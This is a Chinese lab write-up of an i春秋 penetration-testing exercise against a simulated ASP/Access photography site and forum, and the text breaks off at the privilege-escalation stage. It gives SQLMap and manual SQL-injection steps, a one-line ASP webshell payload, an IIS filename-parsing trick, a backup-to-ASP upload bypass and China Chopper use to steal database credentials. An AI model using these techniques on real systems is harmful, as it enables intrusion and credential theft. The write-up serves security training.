<p>简单介绍一下靶机环境：主站为<strong>秋潮个人摄影网站管理系统</strong>，主站下还有一个 <strong><a target="_blank" rel="noopener" href="http://www.leadbbs.com/index.asp">LeadBBS</a> 论坛</strong>，均采用 <strong>ASP</strong> 后端脚本语言与 <strong>Microsoft Office Access</strong> 数据库，此类小型 CMS 一般都没有官网，且漏洞较多无人维护，只能从各大软件平台下载源码；服务器系统为 <strong>Windows Server 2003 Enterprise Edition</strong>，如果没打好补丁，此系统也是漏洞百出。显然，靶机采用了经典网站服务器的标配 <strong>Windows + IIS + ASP + Access</strong> 。</p>
<p>可见，本实验的渗透方法与靶机环境与 <a target="_blank" rel="noopener" href="https://ciphersaw.github.io/2018/03/20/%E3%80%90i%E6%98%A5%E7%A7%8B%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%20%E2%80%94%E2%80%94%20%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/">【i春秋】渗透测试入门 —— 我很简单，请不要欺负我</a> 中的大同小异，因此可作为本文的参考。</p>
<ul>
<li>题目链接：<a target="_blank" rel="noopener" href="https://www.ichunqiu.com/battalion?t=2&r=54399">https://www.ichunqiu.com/battalion?t=2&r=54399</a></li>
<li>解题链接：<a target="_blank" rel="noopener" href="https://www.ichunqiu.com/vm/111/1">https://www.ichunqiu.com/vm/111/1</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/guide.png" alt="guide"></p>
<h1 id="0x01-后台管理员「linhai」的密码是？"><a href="#0x01-后台管理员「linhai」的密码是？" class="headerlink" title="0x01 后台管理员「linhai」的密码是？"></a>0x01 后台管理员「linhai」的密码是？</h1><p>后台管理员的密码是打开渗透测试大门的钥匙，但网上关于「秋潮个人摄影网站管理系统」的漏洞信息少之又少，毕竟是个小众 CMS，所以我们只能自己动手，丰衣足食。根据这几次模拟渗透的经验，获取后台管理员密码的思路主要有<strong>敏感信息泄露、SQL 报错注入返回敏感信息、手工注入或利用自动化注入工具直接读取数据库</strong>等，我们还是先按照常规套路：<strong>寻找网页中存在的注入点</strong>。</p>
<h2 id="SQL-自动化注入"><a href="#SQL-自动化注入" class="headerlink" title="SQL 自动化注入"></a>SQL 自动化注入</h2><p>使用 SQL 自动化注入工具是读取数据库信息最高效的方法，熟悉多种注入工具也是一名合格渗透工程师的基本要求，国内外的 SQL 自动化注入工具种类繁多，常见的有明小子（Domian）、穿山甲（Pangolin）、啊D注入工具、SQLMap 等。</p>
<p>下面以明小子（Domian）与 SQLMap 为例进行演示，以上工具均在实验工具箱中的【注入工具】文件夹下。</p>
<h3 id="明小子（Domian）"><a href="#明小子（Domian）" class="headerlink" title="明小子（Domian）"></a>明小子（Domian）</h3><p><strong>明小子（Domian）</strong>是国内的一款 Web 应用程序综合渗透工具，有可视化图形界面，简单易用，在国内安全圈极负盛名。</p>
<p>打开工具，依次点击 <strong>SQL注入 -&gt; 批量扫描注入点 -&gt; 添加网址</strong>，填入主站 URL <code>http://www.test/ichunqiu/</code>，保存后点击 <strong>批量分析注入点</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-info.png" alt="domain-info"></p>
<p>分析完毕后，可见又是一堆数字型 SQL 注入，以第 3 个注入点为例，右键点击 <strong>检测注入</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-injectable.png" alt="domain-injectable"></p>
<p>接着会自动跳转至 <strong>SQL注入猜解检测</strong> 选项卡，再点击 <strong>开始检测</strong>，证实了 <code>http://www.test.ichunqiu/see.asp?id=480&amp;titleid=102</code> 确实是一个可用的注入点：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-verification.png" alt="domain-verification"></p>
<p>确认可注入后，点击 <strong>猜解表名</strong> 后得到 3 张表，接着选中 <code>admin</code> 表，点击 <strong>猜解列名</strong> 后得到 3 个列名，在所有列名前打上钩，点解 <strong>猜解内容</strong> 后即可得到管理员的账号为 <code>linhai</code>，16 位的密码哈希值为 <code>d7e15730ef9708c0</code>。至此，通过明小子工具成功地获取了管理员的账号密码。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-result.png" alt="domain-result"></p>
<h3 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h3><p><a target="_blank" rel="noopener" href="http://sqlmap.org/"><strong>SQLMap</strong></a> 是一款专注于自动化 SQL 注入检测的开源渗透工具，用 Python 脚本语言编写，能在装有 Python 2.6.x 与 Python 2.7.x 的系统上跨平台运行，支持对数十种常见数据库的检测，被誉为 SQL 注入领域的一大渗透神器。</p>
<p>由于 SQLMap 只支持命令行界面，且默认不支持批量扫描注入点，故其易用性不如明小子，但也丝毫不影响其渗透威力，反而还拥有更高的检测效率与更广的检测范围。SQLMap 作为渗透工程师常用且必备的工具，应当重点掌握。下面将列出渗透过程中常用的命令及用法，建议同时参考<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki">官方文档</a>。</p>
<p>（1）<code>python sqlmap.py -h</code>：查询帮助手册。<br>（2）<code>python sqlmap.py -u &lt;URL&gt;</code>：检测该 URL 是否存在注入（末尾记得写上查询参数）。<br>（3）<code>python sqlmap.py -u &lt;URL&gt; --dbs</code>：查询所有数据库名。<br>（4）<code>python sqlmap.py -u &lt;URL&gt; --current-db</code>：查询当前数据库名。<br>（5）<code>python sqlmap.py -u &lt;URL&gt; -D &lt;database&gt; --tables</code>：查询某数据库中的所有表名。<br>（6）<code>python sqlmap.py -u &lt;URL&gt; -D &lt;database&gt; -T &lt;table&gt; --columns</code>：查询某数据表中的所有列名。<br>（7）<code>python sqlmap.py -u &lt;URL&gt; -D &lt;database&gt; -T &lt;table&gt; -C &lt;column&gt; --dump</code>：查询某列中的所有数据。</p>
<p>以上是通过 GET 方式来检测注入点，并进行 SQL 注入读取数据库中数据的常规套路。<strong>注意一个特例：由于 Microsoft Access 数据库结构特殊，注入时不必通过（3）或（4）来查询数据库名，直接从（5）开始查询表名即可，<code>-D</code> 选项也可省去。</strong></p>
<blockquote>
<p>小贴士：为了避免在命令行界面输入中文进入【SQLMap】目录，因此使用前建议将【SQLMap】文件夹拷贝到 C 盘下。</p>
</blockquote>
<p>确保了命令行路径在【SQLMap】目录下后，根据（2）输入命令 <code>python sqlmap.py -u &quot;http://www.test.ichunqiu/see.asp?id=480&amp;titleid=102&quot;</code>，若询问「已检测到后台数据库为 Microsoft Access，需要跳过对其他数据库的检测吗？」填 <code>Y</code>，询问「想对 Microsoft Access 进行更全面的测试吗？」填 <code>Y</code>，询问「想尝试用随机整数值进行测试吗？」填 <code>Y</code>，询问「已确认 <code>id</code> 参数可注入，还需检测其他参数？」填 <code>y</code>，询问「已确认 <code>titleid</code> 参数可注入，还需检测其他参数？」填 <code>y</code>，询问「请选择一个注入点？」填 <code>0</code>。<strong>注意：此处 URL 中包含两个请求参数，所以最好用双引号将 URL 括起来。</strong></p>
<blockquote>
<p>小贴士：以上操作是为了全面检验注入点，实际上找到一个注入点后，即可填 <code>N</code> 终止检测其他参数。为简化后续注入流程的叙述，在选择注入点时默认填 <code>0</code>。</p>
</blockquote>
<p>结果显示 <code>id</code> 与 <code>titleid</code> 参数均为<strong>基于布尔的盲注（boolean-based blind）</strong>，并且返回了一些服务器相关信息，如：服务器操作系统为 <strong>Windows 2003 或 Windows XP</strong>，Web 应用程序采用了 <strong>APS.NET、Microsoft IIS 6.0、ASP</strong> 等建站技术，后端数据库数理系统为 <strong>Microsoft Access</strong>。以上对服务器相关信息的收集有助于后续更高效精准的渗透。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/sqlmap-info.png" alt="sqlmap-info"></p>
<p>知道了后端数据库是 Microsoft Access 后，可以跳过（3）或（4）直接进行（5），输入命令 <code>python sqlmap.py -u &quot;http://www.test.ichunqiu/see.asp?id=480&amp;titleid=102&quot; --tables</code>，若询问「需要检测常用表名是否存在？」填 <code>Y</code>，询问「需要的线程数量？」填最大值 <code>10</code>。等待扫描全部结束后，得到了包含 <code>admin</code> 表在内的 4 张表。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/sqlmap-tables.png" alt="sqlmap-tables"></p>
<p>继续执行（6）中的命令，输入 <code>python sqlmap.py -u &quot;http://www.test.ichunqiu/see.asp?id=480&amp;titleid=102&quot; -T &quot;admin&quot; --columns</code>，若询问「需要检测常用列名是否存在？」填 <code>Y</code>，询问「需要的线程数量？」填最大值 <code>10</code>。等待扫描全部结束后，得到了 <code>admin</code> 与 <code>password</code> 等 3 个字段。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/sqlmap-columns.png" alt="sqlmap-columns"></p>
<p>最后执行（7）中的命令，输入 <code>python sqlmap.py -u &quot;http://www.test.ichunqiu/see.asp?id=480&amp;titleid=102&quot; -T &quot;admin&quot; -C &quot;admin,password&quot; --dump</code>，等待其枚举完毕，若询问「需要临时保存结果的哈希值？」填 <code>N</code>，询问「需要用字典攻击来破解结果？」填 <code>n</code>，最终可得到管理员的账号密码。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/sqlmap-result.png" alt="sqlmap-result"></p>
<h2 id="SQL-手工注入"><a href="#SQL-手工注入" class="headerlink" title="SQL 手工注入"></a>SQL 手工注入</h2><p>除了会使用 SQL 自动化注入工具，手工注入也应该是渗透工程师的基本技能之一。下面仍旧针对上述注入点，演示手工注入获取 Access 数据库内容的全过程。详细指导可参考：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/geecky/article/details/51297268">asp+access sql手工注入步骤</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0nth3way/articles/7123033.html">access手工注入</a></p>
</blockquote>
<h3 id="Step-1：猜解表名"><a href="#Step-1：猜解表名" class="headerlink" title="Step 1：猜解表名"></a>Step 1：猜解表名</h3><p>在火狐浏览器打开存在注入点的页面，将 URL 改为 <code>http://www.test.ichunqiu/see.asp?id=480&amp;titleid=102 AND EXISTS(SELECT * FROM &lt;table&gt;)</code>，其中 <code>&lt;table&gt;</code> 为待猜解的表名，如果表名存在，页面将显示正常，否则出现异常。<strong>注意：如果管理员把库名、表名、列名更改得随机复杂，手工注入将变得非常困难。</strong></p>
<p>打开 HackBar 工具，我们对 <code>admin</code>、<code>news</code>、<code>config</code> 等常见表名进行猜解，发现均能正常显示：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-tables.png" alt="manual-tables"></p>
<h3 id="Step-2：猜解列数"><a href="#Step-2：猜解列数" class="headerlink" title="Step 2：猜解列数"></a>Step 2：猜解列数</h3><p>已知 <code>admin</code> 表存在后，接着猜解当前未知表的列数，用于后续的<a target="_blank" rel="noopener" href="http://www.w3school.com.cn/sql/sql_union.asp">联合查询（UNION SELECT）</a>，因为<strong>联合查询的必要条件是每个查询的列数需要严格相等，并且有的数据库要求每列的数据类型也必须相同</strong>。</p>
<p>猜解列数最便捷的方法是利用 <a target="_blank" rel="noopener" href="http://www.w3school.com.cn/sql/sql_orderby.asp"><strong>ORDER BY</strong></a> 语句的隐藏用法。一般来说，<code>ORDER BY &lt;column&gt;</code> 代表对 <code>&lt;column&gt;</code> 列进行升排序，而 <strong><code>ORDER BY &lt;column_order&gt;</code> 代表对第 <code>&lt;column_order&gt;</code> 列进行升排序</strong>。显然，<code>&lt;column_order&gt;</code> 的最大取值即为查询数据的列数，因此，当发现 <code>ORDER BY n</code> 与 <code>ORDER BY n+1</code> 的页面显示不同时，可判断当前查询数据的列数为 n。</p>
<p><strong>注意，只有在后端数据库的查询语句为 <code>SELECT * FROM admin</code> 时，当前查询数据的列数 n 才等于数据库 <code>admin</code> 的总列数。</strong>详情可参考：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000002655427">sql注入之order by猜列数问题</a>。</p>
<p>经过简单测试，可以确定查询数据的列数为 2：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-num-true.png" alt="manual-num-true"></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-num-false.png" alt="manual-num-false"></p>
<h3 id="Step-3：找出显位点"><a href="#Step-3：找出显位点" class="headerlink" title="Step 3：找出显位点"></a>Step 3：找出显位点</h3><p>下面要构造联合查询 <code>UNION SELECT 1,2,...,n FROM &lt;table&gt;</code> 找出显位点，其中列数为 n，表名为 <code>&lt;table&gt;</code>。<strong>注意：对于数据类型不兼容的数据库，以上方法会造成语句错误，此时需改为 <code>UNION SELECT null,null,...,null FROM &lt;table&gt;</code> 才能正常执行，但同时也失去了查找显位点的效果。</strong></p>
<blockquote>
<p>小贴士：查询结果中的某些数据会出现在当前页面，而这些数据对应的列称为<strong>显位点</strong>。</p>
</blockquote>
<p>由于目标数据库只有 2 列，简单测试后即可发现第 1 列为显位点：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-points.png" alt="manual-points"></p>
<h3 id="Step-4：猜解列名"><a href="#Step-4：猜解列名" class="headerlink" title="Step 4：猜解列名"></a>Step 4：猜解列名</h3><p>最后一步，就是用猜想的列名去替换显位点，如果猜想正确，则页面会显示数据内容，否则出现异常。我们对 <code>user</code>、<code>username</code>、<code>account</code>、<code>admin</code>、<code>pwd</code>、<code>password</code>、<code>key</code>、<code>credit</code> 等常见列名进行猜解，终于从 <code>admin</code>、<code>password</code> 两列中读取到管理员的账号密码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-admin.png" alt="manual-admin"></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-password.png" alt="manual-password"></p>
<h2 id="社工字典攻击"><a href="#社工字典攻击" class="headerlink" title="社工字典攻击"></a>社工字典攻击</h2><p>既然实验手册提示使用社工工具，那不妨对管理员「linhai」进行一次社工攻击。</p>
<p>将主站所有页面都浏览一遍，在页面底部均能发现以下信息：管理员的 QQ 号为 <strong>1957692</strong>，Email 为 <strong><a href="mailto:&#108;&#105;&#x6e;&#x68;&#x61;&#x69;&#48;&#56;&#49;&#50;&#x40;&#x32;&#49;&#99;&#110;&#x2e;&#99;&#111;&#x6d;">&#108;&#105;&#x6e;&#x68;&#x61;&#x69;&#48;&#56;&#49;&#50;&#x40;&#x32;&#49;&#99;&#110;&#x2e;&#99;&#111;&#x6d;</a></strong>，并由此推算出生日期是 <strong>8 月 21 日</strong>，还发现了主站的<strong>管理入口</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/linhai-email-qq.png" alt="linhai-email-qq"></p>
<p>还在 <strong>摄影论坛</strong> 选项卡中发现一个用 LeadBBS 搭建的论坛，习惯性地用账号 <code>admin</code> 与密码 <code>admin</code> 尝试登录，居然成功进去了（若尝试失败，直接注册一个账号也是能登录进去查看相关信息的），并在 <strong>论坛信息 -&gt; 论坛管理团队</strong> 中发现「linhai」为论坛管理人员：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/linhai-manager.png" alt="linhai-manager"></p>
<p> 点击「linhai」查看其相关信息，在 <strong>签名栏</strong> 中发现他生于唐山大地震，即 <strong>1976 年</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/linhai-born.png" alt="linhai-born"></p>
<p>以上是在网站上能挖掘到关于「linhai」的全部信息，接下来打开工具箱【社工辅助】中的<strong>亦思想社会工程学字典生成器</strong>，将收集的信息填入，点击 <strong>生成字典</strong>，在本目录下打开字典 <strong>mypass.txt</strong>，即可看到一系列密码的猜测值：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dict.png" alt="dict"></p>
<p>再打开【破解工具】-&gt;【MD5】中的 <strong>MD5Crack2</strong>，在 <strong>破解单个密文</strong> 栏中填入上文获取的密码哈希值 <code>d7e15730ef9708c0</code>，在 <strong>使用字典 -&gt; 字典一</strong> 中点击 <strong>浏览</strong>，选中刚才生成的社工字典（在 <strong>文件类型</strong> 中选择 <strong>文本文件(*.txt)</strong> 即可看到文本文件），点击 <strong>开始</strong>，成功破解后即可看到管理员的密码明文 <code>linhai19760812</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/md5crack2.png" alt="md5crack2"></p>
<p>由于模拟渗透环境的特殊性，该密码哈希值经常被提交至各大 MD5 破解网站，因此用在线的  <a target="_blank" rel="noopener" href="http://www.dmd5.com/md5-decrypter.jsp">MD5解密工具</a> 也能得到管理员的密码明文：</p>
<blockquote>
<p>小贴士：一般来说，复杂的管理员密码，是很难通过在线破解立即查询到明文的，除非之前被提交查询过，这时只能通过其他手段获取密码明文。</p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/linhai-password.png" alt="linhai-password"></p>
<h1 id="0x02-LeadBBS-论坛可否获得-webshell？"><a href="#0x02-LeadBBS-论坛可否获得-webshell？" class="headerlink" title="0x02 LeadBBS 论坛可否获得 webshell？"></a>0x02 LeadBBS 论坛可否获得 webshell？</h1><p><strong>注意：上一节获取 <code>linhai</code> 账户的密码 <code>linhai19760812</code>，是用于登录主站管理后台的，不是用来登录论坛的，虽然「linhai」也是论坛管理员，但他的密码目前还未知。</strong>因此，我们继续用 <code>admin</code> 账户在论坛中搜刮漏洞，看看可否从论坛中获得 webshell。</p>
<p>浏览了整个论坛，发现只在 <strong>我的控制面板 -&gt; 修改用户资料</strong> 页面中有写入与上传功能。先尝试将一句话木马 <code>&lt;%Eval Request(&quot;cmd&quot;)%&gt;</code> 写入用户资料，不出意外的话 <code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code> 等符号均被转义为 <a target="_blank" rel="noopener" href="http://www.w3school.com.cn/html/html_entities.asp">HTML 字符实体</a>，木马写入失败：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/bbs-html-entity.png" alt="bbs-html-entity"></p>
<p>再尝试上传图片功能，将 C 盘下的 <code>工具.ico</code> 改名为 <code>test.asp;gj.jpg</code>，目的是利用 IIS 解析漏洞，将图片解析为 ASP 脚本文件。点击 <strong>选择文件</strong>，选中 <code>test.asp;gj.jpg</code> 后点击 <strong>上传</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/bbs-uploading.png" alt="bbs-uploading"></p>
<p>发现文件被重新随机命名，因此想控制文件名利用解析漏洞，也以失败而告终：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/bbs-uploaded.png" alt="bbs-uploaded"></p>
<p>此外，笔者还用了 Burp Suite 工具抓包改包，试图构造畸形目录触发解析漏洞，但在图片上传的包中也没发现可控的上传路径，故尝试失败。有兴趣的读者可自行尝试，此处就不演示了。</p>
<p>用浏览器也没有搜索到 LeadBBS 有效的漏洞信息，不过，没有绝对安全的系统，有兴趣可以下载论坛源码进行审计，相信一定能找到突破口的。总之，目前暂时<strong>不可以</strong>从 LeadBBS 论坛获得 webshell，若各位找到了获得 webshell 的方法，笔者愿闻其详。</p>
<h1 id="0x03-SQL-Server-数据库-sa-账号的密码是？"><a href="#0x03-SQL-Server-数据库-sa-账号的密码是？" class="headerlink" title="0x03 SQL Server 数据库 sa 账号的密码是？"></a>0x03 SQL Server 数据库 sa 账号的密码是？</h1><p>点击在主站页面底部发现的 <strong>管理入口</strong>，用账号 <code>linhai</code> 与密码 <code>linhai19760812</code> 登录进入后台：</p>
<blockquote>
<p>小贴士：若 CMS 保留默认设置，即使主站页面没给出后台管理入口，也能通过后台扫描工具，或搜索该 CMS 的默认后台管理路径来获得。</p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/login-back.png" alt="login-back"></p>
<p>由于主站是个小众 CMS，在未能获取有效漏洞信息，以及没有对其代码审计的情况下，应该对所有页面中可能出现写入或上传漏洞的地方进行黑盒测试。下面以几个测试点为例，演示黑盒测试的过程。</p>
<h2 id="Failure-1：添加图片"><a href="#Failure-1：添加图片" class="headerlink" title="Failure 1：添加图片"></a>Failure 1：添加图片</h2><p>在 <strong>图片管理 -&gt; 添加图片</strong> 页面，发现可以上传图片，先将【我的文档】-&gt;【图片收藏】-&gt;【示例图片】目录中的 <code>Winter.jpg</code> 复制到 C 盘目录下，方便后续使用，然后在页面填写相关信息，并在 <strong>图片一</strong> 中选择 <code>Winter.jpg</code> 后点击 <strong>上传</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-add-picture.png" alt="backend-add-picture"></p>
<p>上传之后，在 <strong>管理图片</strong> 与 <strong>推荐组图</strong> 页面中均未能发现 <code>Winter.jpg</code>，由此推断添加图片功能被禁用了。</p>
<h2 id="Failure-2：文章管理"><a href="#Failure-2：文章管理" class="headerlink" title="Failure 2：文章管理"></a>Failure 2：文章管理</h2><p>在 <strong>系统管理 -&gt; 文章图片</strong> 页面，发现可以写入文章，遂尝试写入一句话木马：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-write-article.png" alt="backend-write-article"></p>
<p>写入之后，打开文章，同样发现 <code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code> 等符号均被转义为 HTML 字符实体，木马写入失败：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-write-article-escape.png" alt="backend-write-article-escape"></p>
<h2 id="Success：系统变量设置-备份数据库"><a href="#Success：系统变量设置-备份数据库" class="headerlink" title="Success：系统变量设置 + 备份数据库"></a>Success：系统变量设置 + 备份数据库</h2><p>在 <strong>设置管理 -&gt; 系统变量设置</strong> 页面，发现可以写入设置信息，以及上传图片。不过，在尝试写入一句话木马时，点击 <strong>设置</strong> 却得到了错误信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-setting-error.png" alt="backend-setting-error"></p>
<p>此路不通，心里莫名一紧，只剩下最后的上传图片功能了。点击 <strong>上传图片</strong>，选择 <code>Winter.jpg</code>，哟嘿，居然能成功上传：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-upload.png" alt="backend-upload"></p>
<p>带着一点小激动，继续点击 <strong>生成代码</strong>，发现图片的路径也给显示出来了：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-upload-path.png" alt="backend-upload-path"></p>
<p>这说明有戏啊！接着探索，在 <strong>数据管理 -&gt; 备份&#x2F;恢复数据库</strong> 页面发现，似乎能把指定文件通过备份转换为 ASP 脚本文件：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-backup-default.png" alt="backend-backup-default"></p>
<p>二话不说，先试一波。从默认备份路径可看出，当前路径应该在 <code>/admin/</code> 下，所以数据库路径为 <code>upfiles/201841631359.jpg</code>，备份的数据库路径为 <code>upfiles/201841631359.asp</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-backup-picture.png" alt="backend-backup-picture"></p>
<p>成功备份后，访问 URL <code>http://www.test.ichunqiu/admin/upfiles/201841631359.asp</code>，得到 ASP 脚本解析错误信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-backup-error.png" alt="backend-backup-error"></p>
<p>因为该 ASP 脚本是由图片文件转化而来，解析错误是理所当然啊！这也进一步证实：<strong>通过备份数据库可以将目标文件转换了 ASP 脚本</strong>。</p>
<p>找到方向后，开始制作图片马，不过注意，<strong>不能通过 <code>copy</code> 命令或文本编辑器将一句话木马附在真正的图片后，否则会出现解析错误。</strong>因此，必须将木马插在文本文件中，再把后缀名改成图片格式即可。为了图片马能成功上传，最好填充大量文本信息，为了使文本文件的大小更接近图片文件：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-trojan.png" alt="backend-trojan"></p>
<p>重复上述步骤，将图片马通过备份数据库转换成 ASP 脚本后，访问 URL <code>http://www.test.ichunqiu/admin/upfiles/201841637712.asp</code>，看到如下页面，说明图片马上传成功：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-trojan-uploaded.png" alt="backend-trojan-uploaded"></p>
<h2 id="菜刀连接获取-webshell"><a href="#菜刀连接获取-webshell" class="headerlink" title="菜刀连接获取 webshell"></a>菜刀连接获取 webshell</h2><p>下面的操作相信大家已轻车熟路，在工具箱【webshell】目录下拔出<a target="_blank" rel="noopener" href="http://www.zhongguocaidao.com/">中国菜刀</a>，在 <strong>添加SHELL</strong> 中填入目标 URL 与请求参数后保存：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/chopper-trojan.png" alt="chopper-trojan"></p>
<p>双击 shell 记录，成功连接网站的文件管理系统：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/chopper-file-manager.png" alt="chopper-file-manager"></p>
<p>然后搜索网站根目录下所有文件，查找有关 SQL Server 数据库的用户信息，最终在 <code>/conn_old.asp</code> 文件中发现账户 <code>sa</code> 的密码为 <code>linhai123456woaini</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/chopper-conn-old.png" alt="chopper-conn-old"></p>
<p><strong>注意：以上发现的 SQL Server 数据库账号密码，与主站目前在用的 Microsoft Access 数据库无任何关系，只是作为考察信息检索能力的题目而存在。从文件名亦可得知，这是主站连接数据库的旧配置信息。</strong></p>
<p>此外，在 <code>/db/</code> 目录下发现了数据库文件，可见 <code>bear.asp</code> 与 <code>bear.ldb</code> 同名，并且 <code>bear.asp</code> 占用空间较大，由此推测为 <code>bear.mdb</code> 的备份数据库文件。</p>
<blockquote>
<p>小贴士：<a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/help/966848/what-is-an-ldb-file">.LDB</a> 文件是打开 Microsoft Access 数据库文件 .MDB 时自动创建与删除的数据信息锁定文件，一般与 .MDB 文件同名，且位于同一目录，用于存储用户名与主机名等相关信息。</p>
</blockquote>
<p>右击 <code>bear.asp</code> 将其下载至桌面，并改名为 <code>bear.mdb</code>。打开明小子注入工具，依次点击 <strong>数据库管理 -&gt; 文件 -&gt; 打开数据库</strong>，选中桌面上的 <code>bear.mdb</code> 文件后打开：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-open-bear-mdb.png" alt="domain-open-bear-mdb"></p>
<p>在数据库中发现了 <code>admin</code> 表，以及主站后台管理员「linhai」的账号密码，从而证实了 <code>bear.asp</code> 文件为主站的后台数据库。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-bear-mdb.png" alt="domain-bear-mdb"></p>
<h1 id="0x04-目标服务器系统的管理员密码是？"><a href="#0x04-目标服务器系统的管理员密码是？" class="headerlink" title="0x04 目标服务器系统的管理员密码是？"></a>0x04 目标服务器系统的管理员密码是？</h1><p>终于到达最后一关：「获取目标服务器的管理员密码」，我们先倒推一下思路：<strong>获得服务器系统管理员权限 -&gt; 破解管理员的密码哈希值 -&gt; 上传提权工具 -&gt; 寻找上传点</strong>，因此首先要做的是确定上传点！</p>
